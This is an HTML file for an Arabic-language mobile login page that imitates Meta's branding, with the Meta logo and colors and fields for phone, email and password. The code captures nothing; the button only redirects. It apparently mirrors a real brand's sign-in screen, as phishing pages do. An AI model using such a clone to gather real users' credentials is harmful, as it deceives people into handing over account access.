<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #1a2530; color: #ffffff; height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; position: relative; }
        .back-arrow { width: 24px; height: 24px; fill: #ffffff; cursor: pointer; }
        .language-selector { position: absolute; left: 50%; transform: translateX(-50%); display: flex; align-items: center; gap: 4px; color: #8b9aab; font-size: 13.5px; cursor: pointer; }
        .language-selector svg { fill: #8b9aab; width: 14px; height: 14px; }
        .main-content { flex-grow: 1; display: flex; flex-direction: column; align-items: center; padding: 0 20px; margin-top: 50px; }
        .logo { width: 65px; height: 65px; border-radius: 50%; object-fit: cover; margin-bottom: 50px; }
        .login-form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
        .input-group input { width: 100%; background-color: transparent; border: 1px solid #3c4d5d; color: #ffffff; padding: 16px 20px; border-radius: 14px; font-size: 15px; outline: none; transition: border-color 0.2s; }
        .input-group input:focus { border-color: #0064e0; }
        .input-group input::placeholder { color: #8b9aab; }
        .login-btn { background-color: #0064e0; color: #ffffff; border: none; padding: 14px; border-radius: 999px; font-size: 15.5px; font-weight: bold; cursor: pointer; margin-top: 4px; }
        .forgot-password { text-align: center; color: #e4e6eb; text-decoration: none; font-size: 14.5px; margin-top: 12px; }
        .bottom-section { padding: 20px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
        .create-account-btn { width: 100%; background-color: transparent; color: #5b9eed; border: 1px solid #2d5a88; padding: 13px; border-radius: 999px; font-size: 15.5px; font-weight: bold; cursor: pointer; }
        .meta-logo-container { display: flex; align-items: center; gap: 6px; margin-bottom: 5px; }
        .meta-icon { width: 18px; height: 18px; fill: none; stroke: #8b9aab; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
        .meta-text { color: #8b9aab; font-size: 16px; font-family: Arial, sans-serif; font-weight: normal; }
    </style>
</head>
<body>
    <div class="top-bar">
        <svg class="back-arrow" viewBox="0 0 24 24" onclick="window.history.back()">
            <path d="M5 12h14M12 5l7 7-7 7" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
        </svg>
        <div class="language-selector">العربية <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
        <div style="width: 24px;"></div>
    </div>
    <div class="main-content">
        <img src="https://i.pinimg.com/736x/56/05/3c/56053cc734c56fd893522013aa3cc69f.jpg" alt="Logo" class="logo">
        <div class="login-form">
            <div class="input-group">
                <input type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
            </div>
            <div class="input-group">
                <input type="password" placeholder="كلمة السر">
            </div>
            <button class="login-btn" onclick="window.location.href='/home.html'">تسجيل الدخول</button>
            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
        </div>
    </div>
    <div class="bottom-section">
        <button class="create-account-btn" onclick="window.location.href='/join.html'">إنشاء حساب جديد</button>
        <div class="meta-logo-container">
            <svg class="meta-icon" viewBox="0 0 24 24"><path d="M6 9c-3.5 0-4 3-4 3s.5 3 4 3c4 0 5-6 8-6 3.5 0 4 3 4 3s-.5 3-4 3c-4 0-5-6-8-6z" /></svg>
            <span class="meta-text">Meta</span>
        </div>
    </div>
</body>
</html>
